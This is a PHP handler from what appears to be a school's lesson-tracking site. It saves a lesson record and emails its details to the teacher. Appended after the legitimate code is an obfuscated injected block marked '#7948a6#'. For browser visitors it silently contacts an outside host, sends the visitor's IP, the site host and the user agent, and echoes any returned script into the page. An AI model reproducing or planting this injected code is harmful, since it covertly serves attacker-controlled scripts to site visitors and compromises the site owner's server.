<?php
include_once( "include/basics.php" );
include_once( "../classes/licoes.php" );
include_once( "../classes/DAO.php" );
include_once( "../classes/professores.php" );
include_once( "../classes/professoresDAO.php" );
include_once( "../classes/alunos.php" );
include_once( "../classes/utils.php" );


$licao = new licoes( $_POST['id'] );
$licao->id_professor = $_POST['id_professor'];
$licao->id_aluno = $_POST['id_aluno'];
$licao->data = util::data2banco($_POST['data']);
$licao->lesson = utf8_decode($_POST['lesson']);
$licao->comentarios = utf8_decode($_POST['comentarios']);
$licao->p = $_POST['p'];
$licao->s = $_POST['s'];
$licao->r = $_POST['r'];
$licao->l = $_POST['l'];
$licao->w = $_POST['w'];
$result = dao::save( $licao );

# envia email

$professor = professoresDAO::getProfessoresById($_SESSION['prof_id']);
$aluno     = DAO::find('alunos', array('id' => $_POST['id_aluno']));

$msg  = 'Data: '.$_POST['data'].'<br>';
$msg .= 'Aluno: '.utf8_decode($aluno[0]->nome).'<br>';
$msg .= 'Lição: '.utf8_decode($_POST['lesson']).'<br>';
$msg .= 'Comentários: '.utf8_decode($_POST['comentarios']).'<br>';
$msg .= 'Avaliação: P:'.$_POST['p'].', S:'.$_POST['s'].', R:'.$_POST['r'].', L:'.$_POST['l'].', W:'.$_POST['w'];

$send = util::send_email(utf8_decode($aluno[0]->nome), $msg, 'backup@beitschool.com', $professor[0]->email);

if ( $result )
{
	$_SESSION['b-msg'] = "Lição gravada com sucesso.";
}
else {
	$_SESSION['b-msg'] = "Não foi possível salvar a lição.";
}

header("Location: home.php?result=" . $result);

?>
<?php
#7948a6#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/7948a6#
?>